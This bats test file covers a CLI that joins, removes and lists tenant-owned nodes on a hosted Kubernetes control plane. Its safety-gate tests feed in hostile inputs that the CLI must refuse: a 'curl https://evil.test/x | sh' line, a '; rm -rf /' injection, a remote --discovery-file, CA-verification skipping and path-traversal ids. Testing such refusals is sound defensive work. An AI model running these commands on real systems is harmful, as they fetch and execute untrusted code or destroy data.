#!/usr/bin/env bats
# kubehz_node_test.bats — `lo kubehz node join|remove|status`, the machines a
# tenant brings to a kubehz-HOSTED control plane (static pools).
#
# What is pinned here
# -------------------
#   preflight  hosting gate (hosted only), HTTPS, KUBEHZ_TOKEN, and the two
#              ways a cluster id is found (--cluster-id, or the registry)
#   join       node-name default + shape, pool inference, the kubeadm/root
#              preconditions BEFORE a ticket is minted, --print-only, and the
#              argv the CLI actually runs
#   safety     a join line that is not a `kubeadm join` line, or that carries
#              characters outside the join alphabet, runs NOTHING
#   errors     the api's refusal codes each render an instruction
#   remove     the draining message and the 404
#   status     the table, the slot count, and the discovery warning
#
# The curl mock is keyed on "<METHOD> <path>" and answers the api's enveloped
# shapes, each with the trailing status line kubehz::space_api's
# -w $'\n%{http_code}' contract expects — the same mock shape as
# kubehz_shared_test.bats.

setup() {
  load "../test_helper"
  setup_tmpdir

  export PATH_BASE="${BATS_TEST_TMPDIR}"
  export PATH_CLUSTERS="${BATS_TEST_TMPDIR}/clusters"

  import() { :; }
  export -f import

  source "${_PROJECT_ROOT}/.lok8s/utils/verbose.sh"
  source "${_PROJECT_ROOT}/.lok8s/utils/http.sh"
  source "${_PROJECT_ROOT}/.lok8s/libs/kubehz/shared"
  source "${_PROJECT_ROOT}/.lok8s/libs/kubehz/node"
  source "${_PROJECT_ROOT}/.lok8s/libs/kubehz/main"

  # argsh `:args` builtin — absent when a lib is sourced in bats (house
  # pattern, see kubehz_claim_test.bats). This stub also handles BOOLEAN long
  # options (--print-only), which the claim stub does not need: a boolean is
  # any --flag whose next token is another flag or the end of argv.
  :args() {
    shift # description
    while (( $# )); do
      case "$1" in
        --*)
          local _n="${1#--}"
          _n="${_n//-/_}"
          if [[ -z "${2:-}" || "${2}" == --* ]]; then
            printf -v "${_n}" '%s' 1
            shift
          else
            printf -v "${_n}" '%s' "${2}"
            shift 2
          fi
          ;;
        *) shift ;;
      esac
    done
  }
  export -f :args

  mkdir -p "${PATH_CLUSTERS}/acme.example.org"
  touch "${PATH_CLUSTERS}/acme.example.org/cluster.lok8s.yaml"

  # The active domain the three subcommands fall back to, the way `lo use`
  # would have set it.
  export DOMAIN_NAME="acme.example.org"

  export KUBEHZ_TOKEN="khz_test_token"
  export CURL_LOG="${BATS_TEST_TMPDIR}/curl.log"
  export CURL_BODY="${BATS_TEST_TMPDIR}/curl-body.json"
  export KUBEADM_LOG="${BATS_TEST_TMPDIR}/kubeadm.log"

  # The mock's default answers live HERE, never as `${VAR:-{...}}` inside the
  # mock: a default value that contains `}` closes the parameter expansion
  # early and the rest lands in the answer as literal text — a mangled body
  # that no jq filter reads, which is a silently green mock.
  export STUB_NODES_CODE="200"
  export STUB_NODES_BODY='{"ok":true,"data":{"nodes":[],"usage":{"nodes":0,"maxStaticNodes":20},"discoveryReady":true}}'
  export STUB_MINT_CODE="201"
  export STUB_MINT_BODY='{"ok":true,"data":{"token":"a1b2c3.d4e5f6g7h8i9j0k1","joinCommand":"kubeadm join cp.example.test:6443 --token a1b2c3.d4e5f6g7h8i9j0k1 --discovery-token-ca-cert-hash sha256:1111 --node-name box-1","nodeName":"box-1","pool":"metal","expiresAt":"2026-09-01T12:00:00Z","ready":true}}'
  export STUB_REMOVE_CODE="200"
  export STUB_REMOVE_BODY='{"ok":true,"data":{"name":"box-1","pool":"metal","status":"Draining"}}'

  # Non-root by default: EUID is readonly, so the root question is its own
  # function and the tests answer it.
  node::is_root() { return 1; }
  export -f node::is_root
}

teardown() {
  teardown_tmpdir
}

# ── stubs ────────────────────────────────────────────────

# yq stub for kubehz::read_config — a hosted cluster on an HTTPS api.
# STUB_HOSTING / STUB_API_URL let a test move either one.
_stub_config() {
  yq() {
    case "$2" in
      '.spec.kubehz.hosting // "self"')        echo "${STUB_HOSTING:-hosted}" ;;
      '.spec.kubehz.apiUrl // ""')             echo "${STUB_API_URL:-https://api.example.test}" ;;
      '.spec.kubehz.access')                   echo "managed" ;;
      '.spec.kubehz.connectHcloudToken // false') echo "false" ;;
      '.spec.kubehz.agent // "cronjob"')       echo "cronjob" ;;
      *) echo "" ;;
    esac
  }
  export -f yq
}

# One curl mock for every route these commands touch. Each response is keyed
# by "<METHOD> <path>"; a test overrides a single answer through the STUB_*
# variables rather than by rewriting the mock.
#
# The trailing status line is appended ONLY when the caller asked for it with
# `-w`. kubehz::space_api does; kubehz::resolve_cluster_id uses `curl -fsSL`
# and pipes the body straight into jq, so a status line there is a second JSON
# document that aborts the filter.
_stub_curl() {
  curl() {
    local method="GET" url="" body="" want_status=0
    while (( $# )); do
      case "$1" in
        -X) method="$2"; shift 2 ;;
        -d) body="$2"; shift 2 ;;
        -w) want_status=1; shift 2 ;;
        https://*) url="$1"; shift ;;
        *) shift ;;
      esac
    done
    echo "${method} ${url}" >> "${CURL_LOG}"
    [[ -n "${body}" ]] && printf '%s' "${body}" > "${CURL_BODY}"

    local answer status
    case "${method} ${url##*api.example.test}" in
      "GET /api/clusters/cl-1234abcd/nodes")
        answer="${STUB_NODES_BODY}"; status="${STUB_NODES_CODE}" ;;
      "GET /api/clusters"*)
        # The tenant registry (?perPage=500). LAST of the GET arms: `case`
        # takes the first match, and this glob also covers the nodes route.
        answer='{"ok":true,"data":[{"id":"cl-1234abcd","domain":"acme.example.org","createdAt":"2026-01-01T00:00:00Z"}]}'
        status="200" ;;
      "POST /api/clusters/cl-1234abcd/nodes/join-token")
        answer="${STUB_MINT_BODY}"; status="${STUB_MINT_CODE}" ;;
      "DELETE /api/clusters/cl-1234abcd/nodes/box-1")
        answer="${STUB_REMOVE_BODY}"; status="${STUB_REMOVE_CODE}" ;;
      *)
        answer='{"ok":false,"data":{"code":"UNMOCKED"}}'
        status="500" ;;
    esac
    if (( want_status )); then
      printf '%s\n%s' "${answer}" "${status}"
    else
      printf '%s' "${answer}"
    fi
  }
  export -f curl
}

# A kubeadm on PATH that records its argv instead of touching the machine.
_stub_kubeadm() {
  kubeadm() { printf '%s\n' "$*" >> "${KUBEADM_LOG}"; }
  export -f kubeadm
}

_stub_hostname() {
  hostname() { echo "${STUB_HOSTNAME:-BOX-1.lan}"; }
  export -f hostname
}

# The full happy-path environment: hosted spec, mocked api, kubeadm present,
# root, and a hostname to default from.
_stub_all() {
  _stub_config
  _stub_curl
  _stub_kubeadm
  _stub_hostname
  node::is_root() { return 0; }
  export -f node::is_root
}

# ── preflight: the hosting gate ──────────────────────────

@test "preflight: a self-hosted domain is refused and told to use its own apiserver" {
  # The exported yq stub reads STUB_HOSTING when it RUNS, so the variable is
  # set for the test, never as a one-shot prefix on the helper call.
  export STUB_HOSTING="self"
  _stub_config
  _stub_curl

  run node::preflight "acme.example.org" "join a node"
  assert_failure
  assert_output --partial "runs its own control plane"
  assert_output --partial "your own API server"
}

@test "preflight: a shared domain is sent to the Space verb, not to node join" {
  export STUB_HOSTING="shared"
  _stub_config
  _stub_curl

  run node::preflight "acme.example.org" "join a node"
  assert_failure
  assert_output --partial "hosting: shared"
  assert_output --partial "lo kubehz join <node-name>"
}

@test "preflight: a plain-HTTP apiUrl is refused before any request" {
  export STUB_API_URL="http://api.example.test"
  _stub_config
  _stub_curl

  run node::preflight "acme.example.org" "join a node"
  assert_failure
  assert_output --partial "must use HTTPS"
  [ ! -f "${CURL_LOG}" ]
}

@test "preflight: without KUBEHZ_TOKEN it names the token and the scope" {
  _stub_config
  _stub_curl
  unset KUBEHZ_TOKEN

  run node::preflight "acme.example.org" "join a node"
  assert_failure
  assert_output --partial "KUBEHZ_TOKEN is required to join a node"
  assert_output --partial "clusters:write"
}

@test "preflight: with no active domain it says how to set one" {
  _stub_config

  run node::preflight "" "join a node"
  assert_failure
  assert_output --partial "No active domain"
}

# ── preflight: finding the cluster id ────────────────────

@test "preflight: a --cluster-id that is not an id is refused before any request" {
  _stub_config
  _stub_curl
  # The value is pasted into a URL path; a traversal in it must not travel.
  cluster_id="../../admin/tenants"

  run node::preflight "acme.example.org" "join a node"
  assert_failure
  assert_output --partial "is not a cluster id"
  [ ! -f "${CURL_LOG}" ]
}

@test "preflight: --cluster-id wins and the registry is never asked" {
  _stub_config
  _stub_curl
  cluster_id="cl-explicit"

  node::preflight "acme.example.org" "join a node"
  [ "${NODE_CLUSTER_ID}" = "cl-explicit" ]
  [ ! -f "${CURL_LOG}" ]
}

@test "preflight: without --cluster-id the id comes from the tenant registry" {
  _stub_config
  _stub_curl

  node::preflight "acme.example.org" "join a node"
  [ "${NODE_CLUSTER_ID}" = "cl-1234abcd" ]
}

@test "preflight: a domain with no registry row is told to name the cluster" {
  _stub_config
  _stub_curl
  # A second domain with a spec of its own — the registry answers, but carries
  # no row for it, which must not read as "the registry is down".
  mkdir -p "${PATH_CLUSTERS}/other.example.org"
  touch "${PATH_CLUSTERS}/other.example.org/cluster.lok8s.yaml"

  run node::preflight "other.example.org" "join a node"
  assert_failure
  assert_output --partial "holds no cluster for other.example.org"
  assert_output --partial "--cluster-id cl-xxxxxxxx"
}

@test "preflight: a domain with no spec file is named in the refusal" {
  _stub_config
  _stub_curl

  run node::preflight "nowhere.example.org" "join a node"
  assert_failure
  assert_output --partial "No cluster.lok8s.yaml for domain: nowhere.example.org"
}

# ── join: the node name ──────────────────────────────────

@test "join: the node name defaults to the short hostname, lowercased" {
  _stub_all
  STUB_HOSTNAME="BOX-1.lan"

  run node::join --pool metal --print-only
  assert_success
  assert_output --partial "Node 'box-1' joins pool 'metal'"
  [ "$(jq -r .nodeName "${CURL_BODY}")" = "box-1" ]
}

@test "join: a name that is not a DNS label is refused before any api call" {
  _stub_all

  run node::join --name "Box_1" --pool metal --print-only
  assert_failure
  assert_output --partial "is not a node name the platform accepts"
  assert_output --partial "DNS label"
  # Nothing was minted: the registry read of preflight is the only request.
  [ ! -f "${CURL_BODY}" ]
  refute_line --partial "POST"
}

# ── join: the pool ───────────────────────────────────────

@test "join: --pool is inferred when every node of the cluster shares one pool" {
  _stub_all
  STUB_NODES_BODY='{"ok":true,"data":{"nodes":[{"name":"box-0","pool":"metal","status":"Ready"}],"usage":{"nodes":1,"maxStaticNodes":20},"discoveryReady":true}}'

  run node::join --name box-1 --print-only
  assert_success
  assert_output --partial "joins pool 'metal'"
  [ "$(jq -r .pool "${CURL_BODY}")" = "metal" ]
}

@test "join: two pools cannot be inferred, so the CLI asks for --pool" {
  _stub_all
  STUB_NODES_BODY='{"ok":true,"data":{"nodes":[{"name":"a","pool":"metal"},{"name":"b","pool":"edge"}],"usage":{"nodes":2,"maxStaticNodes":20},"discoveryReady":true}}'

  run node::join --name box-1 --print-only
  assert_failure
  assert_output --partial "name the static pool"
  assert_output --partial "--pool <pool-name>"
}

@test "join: an empty cluster cannot infer a pool either" {
  _stub_all

  run node::join --name box-1 --print-only
  assert_failure
  assert_output --partial "--pool <pool-name>"
}

# ── join: preconditions, checked BEFORE a ticket is minted ──

@test "join: without kubeadm the CLI refuses and mints nothing" {
  _stub_config
  _stub_curl
  _stub_hostname
  node::is_root() { return 0; }
  export -f node::is_root
  # No _stub_kubeadm: `command -v kubeadm` finds nothing.

  run node::join --name box-1 --pool metal
  assert_failure
  assert_output --partial "kubeadm is not on this machine"
  assert_output --partial "--print-only"
  [ ! -f "${CURL_BODY}" ]
}

@test "join: a non-root shell refuses and mints nothing" {
  _stub_config
  _stub_curl
  _stub_kubeadm
  _stub_hostname

  run node::join --name box-1 --pool metal
  assert_failure
  assert_output --partial "must run as root"
  [ ! -f "${CURL_BODY}" ]
}

@test "join: --print-only needs neither kubeadm nor root" {
  _stub_config
  _stub_curl
  _stub_hostname

  run node::join --name box-1 --pool metal --print-only
  assert_success
  assert_output --partial "kubeadm join cp.example.test:6443"
}

# ── join: the mint payload ───────────────────────────────

@test "join: the detected kubelet version rides with the mint" {
  _stub_all
  kubelet() { echo "Kubernetes v1.33.4"; }
  export -f kubelet

  run node::join --name box-1 --pool metal --print-only
  assert_success
  [ "$(jq -r .kubeletVersion "${CURL_BODY}")" = "v1.33.4" ]
}

@test "join: with no kubelet to ask, the mint carries no version key" {
  _stub_all

  run node::join --name box-1 --pool metal --print-only
  assert_success
  [ "$(jq -r 'has("kubeletVersion")' "${CURL_BODY}")" = "false" ]
}

@test "join: --kubelet-version overrides what the machine reports" {
  _stub_all
  kubelet() { echo "Kubernetes v1.33.4"; }
  export -f kubelet

  run node::join --name box-1 --pool metal --kubelet-version v1.31.0 --print-only
  assert_success
  [ "$(jq -r .kubeletVersion "${CURL_BODY}")" = "v1.31.0" ]
}

# ── join: --print-only ───────────────────────────────────

@test "join --print-only: prints the api's command and runs no kubeadm" {
  _stub_all

  run node::join --name box-1 --pool metal --print-only
  assert_success
  assert_output --partial "kubeadm join cp.example.test:6443 --token a1b2c3.d4e5f6g7h8i9j0k1"
  assert_output --partial "2026-09-01T12:00:00Z"
  assert_output --partial "single use"
  [ ! -f "${KUBEADM_LOG}" ]
}

@test "join --print-only: --node-ip is appended to the printed command" {
  _stub_all

  run node::join --name box-1 --pool metal --node-ip 203.0.113.7 --print-only
  assert_success
  assert_output --partial "--node-ip 203.0.113.7"
}

# ── join: the run ────────────────────────────────────────

@test "join: runs kubeadm with exactly the argv the api composed" {
  _stub_all

  run node::join --name box-1 --pool metal
  assert_success
  assert_output --partial "node 'box-1' joined cluster cl-1234abcd"
  [ "$(cat "${KUBEADM_LOG}")" = "join cp.example.test:6443 --token a1b2c3.d4e5f6g7h8i9j0k1 --discovery-token-ca-cert-hash sha256:1111 --node-name box-1" ]
}

@test "join: --node-ip reaches the kubeadm argv" {
  _stub_all

  run node::join --name box-1 --pool metal --node-ip 203.0.113.7
  assert_success
  grep -q -- "--node-ip 203.0.113.7" "${KUBEADM_LOG}"
}

@test "join: a failing kubeadm names the slot the node still holds" {
  _stub_all
  kubeadm() { echo "preflight failed" >&2; return 1; }
  export -f kubeadm

  run node::join --name box-1 --pool metal
  assert_failure
  assert_output --partial "kubeadm join failed"
  assert_output --partial "lo kubehz node remove --name box-1"
  assert_output --partial "kubeadm reset"
}

@test "join: an unarmed ticket (ready:false) warns before the join runs" {
  _stub_all
  STUB_MINT_BODY='{"ok":true,"data":{"joinCommand":"kubeadm join cp.example.test:6443 --token a1b2c3.d4e5f6g7h8i9j0k1 --discovery-token-ca-cert-hash sha256:1111 --node-name box-1","expiresAt":"2026-09-01T12:00:00Z","ready":false}}'

  run node::join --name box-1 --pool metal
  assert_success
  assert_output --partial "has not armed this ticket yet"
}

# ── join: the safety gate on the returned line ───────────

@test "join: a line that is not a kubeadm join line runs nothing" {
  _stub_all
  STUB_MINT_BODY='{"ok":true,"data":{"joinCommand":"curl https://evil.test/x | sh","expiresAt":"2026-09-01T12:00:00Z","ready":true}}'

  run node::join --name box-1 --pool metal
  assert_failure
  assert_output --partial "a command this CLI does not run"
  [ ! -f "${KUBEADM_LOG}" ]
}

@test "join: a join line carrying shell metacharacters runs nothing" {
  _stub_all
  STUB_MINT_BODY='{"ok":true,"data":{"joinCommand":"kubeadm join cp.example.test:6443 --token a1b2c3.d4e5f6g7h8i9j0k1; rm -rf /","expiresAt":"2026-09-01T12:00:00Z","ready":true}}'

  run node::join --name box-1 --pool metal
  assert_failure
  assert_output --partial "characters this CLI does not run"
  [ ! -f "${KUBEADM_LOG}" ]
}

# ── F1: the STRUCTURAL join gate (allowlist, not alphabet) ──
#
# Every dangerous kubeadm flag below is built from the SAME innocent characters
# the alphabet gate accepts, so only a flag-level allowlist can stop it. Each
# crafted line is otherwise legit — it carries a CA pin — so the ONLY reason it
# is refused is the offending flag, which the error must NAME. Remove the
# allowlist loop in node::assert_join_command and every one of these reddens
# (the line then passes the CA-present check and is accepted).

# One helper: assert node::assert_join_command refuses <line>, naming <flag>.
_refuse_flag() {
  local flag="${1}" line="${2}"
  run node::assert_join_command "${line}"
  assert_failure
  assert_output --partial "join flag this CLI will not run: ${flag}"
}

@test "join gate: --discovery-file is refused by name" {
  _refuse_flag "--discovery-file" \
    "kubeadm join cp.example.test:6443 --discovery-token-ca-cert-hash sha256:1111 --discovery-file https://evil.test/kubeconfig --node-name box-1"
}

@test "join gate: --config is refused by name" {
  _refuse_flag "--config" \
    "kubeadm join cp.example.test:6443 --discovery-token-ca-cert-hash sha256:1111 --config=/tmp/kubeadm.conf --node-name box-1"
}

@test "join gate: --control-plane is refused by name" {
  _refuse_flag "--control-plane" \
    "kubeadm join cp.example.test:6443 --discovery-token-ca-cert-hash sha256:1111 --control-plane --node-name box-1"
}

@test "join gate: --certificate-key is refused by name" {
  _refuse_flag "--certificate-key" \
    "kubeadm join cp.example.test:6443 --discovery-token-ca-cert-hash sha256:1111 --certificate-key deadbeef --node-name box-1"
}

@test "join gate: --discovery-token-unsafe-skip-ca-verification is refused by name" {
  _refuse_flag "--discovery-token-unsafe-skip-ca-verification" \
    "kubeadm join cp.example.test:6443 --discovery-token-ca-cert-hash sha256:1111 --discovery-token-unsafe-skip-ca-verification --node-name box-1"
}

@test "join gate: --ignore-preflight-errors is refused by name" {
  _refuse_flag "--ignore-preflight-errors" \
    "kubeadm join cp.example.test:6443 --discovery-token-ca-cert-hash sha256:1111 --ignore-preflight-errors=all --node-name box-1"
}

@test "join gate: the legit api shape with one CA hash is accepted" {
  node::assert_join_command \
    "kubeadm join cp.example.test:6443 --token a1b2c3.d4e5f6g7h8i9j0k1 --discovery-token-ca-cert-hash sha256:1111 --node-name box-1"
}

@test "join gate: the legit api shape with two CA hashes is accepted" {
  node::assert_join_command \
    "kubeadm join cp.example.test:6443 --token a1b2c3.d4e5f6g7h8i9j0k1 --discovery-token-ca-cert-hash sha256:1111 --discovery-token-ca-cert-hash sha256:2222 --node-name box-1"
}

@test "join gate: a line with no CA fingerprint is refused" {
  run node::assert_join_command \
    "kubeadm join cp.example.test:6443 --token a1b2c3.d4e5f6g7h8i9j0k1 --node-name box-1"
  assert_failure
  assert_output --partial "pins no CA fingerprint"
}

@test "join gate: a server address that is not host:port is refused" {
  run node::assert_join_command \
    "kubeadm join not-an-endpoint --token a1b2c3.d4e5f6g7h8i9j0k1 --discovery-token-ca-cert-hash sha256:1111 --node-name box-1"
  assert_failure
  assert_output --partial "not a host:port"
}

@test "join gate: a dangerous flag reaches nothing through the full join path" {
  _stub_all
  STUB_MINT_BODY='{"ok":true,"data":{"joinCommand":"kubeadm join cp.example.test:6443 --discovery-token-ca-cert-hash sha256:1111 --discovery-token-unsafe-skip-ca-verification --node-name box-1","expiresAt":"2026-09-01T12:00:00Z","ready":true}}'

  run node::join --name box-1 --pool metal
  assert_failure
  assert_output --partial "join flag this CLI will not run: --discovery-token-unsafe-skip-ca-verification"
  [ ! -f "${KUBEADM_LOG}" ]
}

@test "join: a mint that returns no command runs nothing and names the held slot" {
  _stub_all
  STUB_MINT_BODY='{"ok":true,"data":{"token":"a1b2c3.d4e5f6g7h8i9j0k1","expiresAt":"2026-09-01T12:00:00Z"}}'

  run node::join --name box-1 --pool metal
  assert_failure
  assert_output --partial "returned no join command"
  # F3: the empty-command path names the held slot, like the kubeadm-failed one.
  assert_output --partial "holds a node slot"
  assert_output --partial "lo kubehz node remove --name box-1"
  [ ! -f "${KUBEADM_LOG}" ]
}

# F2: a 2xx body is not a promise of JSON. A non-JSON mint body must not crash
# `lo` with a raw jq error AFTER the ticket was minted — it must reach the
# held-slot error. Under errexit (lo's runtime), the UNGUARDED `$(jq …)` aborts
# node::join at the assignment and this message never prints — mutation-check.
@test "join: a non-JSON 2xx mint body errors about the held ticket, not a jq crash" {
  _stub_all
  STUB_MINT_CODE="200"
  STUB_MINT_BODY='<html><body>502 Bad Gateway</body></html>'

  _join_under_errexit() { set -eo pipefail; node::join --name box-1 --pool metal; }
  run _join_under_errexit

  assert_failure
  assert_output --partial "returned no join command"
  assert_output --partial "holds a node slot"
  assert_output --partial "lo kubehz node remove --name box-1"
  [ ! -f "${KUBEADM_LOG}" ]
}

# ── the api's refusal vocabulary ─────────────────────────

@test "error: STATIC_POOLS_NOT_ENABLED names the flag and who sets it" {
  _stub_all
  STUB_MINT_CODE="400"
  STUB_MINT_BODY='{"ok":false,"data":{"code":"STATIC_POOLS_NOT_ENABLED","message":"static pools are not enabled"}}'

  run node::join --name box-1 --pool metal
  assert_failure
  assert_output --partial "staticPoolsEnabled"
  assert_output --partial "kubehz support"
}

@test "error: KUBELET_BELOW_FLOOR states the rule and the fix" {
  _stub_all
  STUB_MINT_CODE="400"
  STUB_MINT_BODY='{"ok":false,"data":{"code":"KUBELET_BELOW_FLOOR","message":"v1.29.0 is below the floor v1.31"}}'

  run node::join --name box-1 --pool metal
  assert_failure
  assert_output --partial "kubelet on this machine is too old"
  assert_output --partial "v1.29.0 is below the floor v1.31"
  assert_output --partial "two minor versions"
}

@test "error: QUOTA_EXCEEDED points at the command that frees a slot" {
  _stub_all
  STUB_MINT_CODE="403"
  STUB_MINT_BODY='{"ok":false,"data":{"code":"QUOTA_EXCEEDED","message":"20 of 20 nodes"}}'

  run node::join --name box-1 --pool metal
  assert_failure
  assert_output --partial "no free slot"
  assert_output --partial "lo kubehz node remove --name"
}

@test "error: CONTROL_PLANE_NOT_READY explains what has not happened yet" {
  _stub_all
  STUB_MINT_CODE="409"
  STUB_MINT_BODY='{"ok":false,"data":{"code":"CONTROL_PLANE_NOT_READY","message":"no discovery"}}'

  run node::join --name box-1 --pool metal
  assert_failure
  assert_output --partial "has not published its join address"
  assert_output --partial "kind: static"
}

@test "error: NODE_EXISTS offers both ways out" {
  _stub_all
  STUB_MINT_CODE="409"
  STUB_MINT_BODY='{"ok":false,"data":{"code":"NODE_EXISTS","message":"box-1 exists"}}'

  run node::join --name box-1 --pool metal
  assert_failure
  assert_output --partial "already holds a node with that name"
  assert_output --partial "--name"
  assert_output --partial "lo kubehz node remove"
}

@test "error: POOL_NOT_STATIC says which pool kind a brought machine joins" {
  _stub_all
  STUB_MINT_CODE="409"
  STUB_MINT_BODY='{"ok":false,"data":{"code":"POOL_NOT_STATIC","message":"metal is a machineDeployment pool"}}'

  run node::join --name box-1 --pool metal
  assert_failure
  assert_output --partial "kind: static"
}

@test "error: STEP_UP_REQUIRED sends the caller to an API token" {
  _stub_all
  STUB_MINT_CODE="403"
  STUB_MINT_BODY='{"ok":false,"data":{"code":"STEP_UP_REQUIRED","message":"fresh sign-in required"}}'

  run node::join --name box-1 --pool metal
  assert_failure
  assert_output --partial "KUBEHZ_TOKEN"
}

@test "error: an unknown code falls through to the api's own words" {
  _stub_all
  STUB_MINT_CODE="418"
  STUB_MINT_BODY='{"ok":false,"data":{"code":"SOMETHING_NEW","message":"the api knows best","help":"read the docs"}}'

  run node::join --name box-1 --pool metal
  assert_failure
  assert_output --partial "the api knows best"
  assert_output --partial "read the docs"
}

# ── remove ───────────────────────────────────────────────

@test "remove: says the node drains, the slot is free, and the machine is kept" {
  _stub_all

  run node::remove --name box-1
  assert_success
  assert_output --partial "node 'box-1' is draining"
  assert_output --partial "pool metal"
  assert_output --partial "slot is free"
  assert_output --partial "never the hardware"
  assert_output --partial "kubeadm reset"
  grep -q "DELETE https://api.example.test/api/clusters/cl-1234abcd/nodes/box-1" "${CURL_LOG}"
}

@test "remove: a --name that is not a node name is refused before any request" {
  _stub_all

  run node::remove --name "../../clusters"
  assert_failure
  assert_output --partial "is not a node name the platform accepts"
  [ ! -f "${CURL_LOG}" ]
}

@test "remove: an unknown node names the cluster and points at status" {
  _stub_all
  STUB_REMOVE_CODE="404"
  STUB_REMOVE_BODY='{"ok":false,"data":{"code":"NOT_FOUND","message":"Node not found on this cluster"}}'

  run node::remove --name box-1
  assert_failure
  assert_output --partial "holds no node named 'box-1'"
  assert_output --partial "lo kubehz node status"
}

# ── status ───────────────────────────────────────────────

@test "status: renders the slot count and one row per node" {
  _stub_all
  STUB_NODES_BODY='{"ok":true,"data":{"nodes":[{"name":"box-1","pool":"metal","status":"Ready","joinedAt":"2026-08-30T10:00:00Z"},{"name":"box-2","pool":"metal","status":"Joining","joinedAt":null}],"usage":{"nodes":2,"maxStaticNodes":20},"discoveryReady":true}}'

  run node::status
  assert_success
  assert_output --partial "Cluster: cl-1234abcd (acme.example.org)"
  assert_output --partial "Nodes:   2/20"
  assert_output --partial "NAME"
  assert_output --partial "box-1"
  assert_output --partial "Ready"
  assert_output --partial "2026-08-30T10:00:00Z"
  assert_output --partial "box-2"
  assert_output --partial "Joining"
}

@test "status: an empty cluster gets the join hint, not an empty table" {
  _stub_all

  run node::status
  assert_success
  assert_output --partial "No nodes yet"
  assert_output --partial "lo kubehz node join --pool"
}

@test "status: warns while the control plane has published no join address" {
  _stub_all
  STUB_NODES_BODY='{"ok":true,"data":{"nodes":[],"usage":{"nodes":0,"maxStaticNodes":20},"discoveryReady":false}}'

  run node::status
  assert_success
  assert_output --partial "has not published its join address"
}

@test "status: a ready control plane raises no discovery warning" {
  _stub_all

  run node::status
  assert_success
  refute_output --partial "has not published its join address"
}

# ── F5: the global --cluster/-s collision ────────────────

@test "join: the inherited --cluster is refused and points at --cluster-id" {
  _stub_all

  run node::join --cluster cl-wrong --pool metal --print-only
  assert_failure
  assert_output --partial "--cluster/-s names the kind cluster"
  assert_output --partial "--cluster-id cl-xxxxxxxx"
}

@test "join: the short -s is refused the same way" {
  _stub_all

  run node::join -s cl-wrong --pool metal --print-only
  assert_failure
  assert_output --partial "--cluster-id cl-xxxxxxxx"
}

@test "remove: the inherited --cluster is refused" {
  _stub_all

  run node::remove --name box-1 --cluster cl-wrong
  assert_failure
  assert_output --partial "--cluster-id cl-xxxxxxxx"
  [ ! -f "${CURL_LOG}" ]
}

@test "status: the inherited --cluster is refused" {
  _stub_all

  run node::status --cluster cl-wrong
  assert_failure
  assert_output --partial "--cluster-id cl-xxxxxxxx"
}

@test "join: --cluster-id is NOT mistaken for the global --cluster" {
  _stub_all

  run node::join --cluster-id cl-1234abcd --name box-1 --pool metal --print-only
  assert_success
  assert_output --partial "cluster cl-1234abcd"
}

# ── dispatch ─────────────────────────────────────────────

@test "the node group is registered on lo kubehz" {
  run grep -c "'node|n'" "${_PROJECT_ROOT}/.lok8s/libs/kubehz/main"
  assert_success
  assert_output "1"
}

# F6: the group is registered above, but a registered group with no import is
# dead on dispatch. Pin the import line itself — the unit harness stubs
# `import` to a no-op (it sources node directly), so runtime cannot see the
# import; this grep is the deterministic equivalent, and it reddens the moment
# `import ^libs/kubehz/node` is dropped from main.
@test "lo kubehz imports the node lib (dispatch is dead without it)" {
  run grep -c '^import \^libs/kubehz/node$' "${_PROJECT_ROOT}/.lok8s/libs/kubehz/main"
  assert_success
  assert_output "1"
}
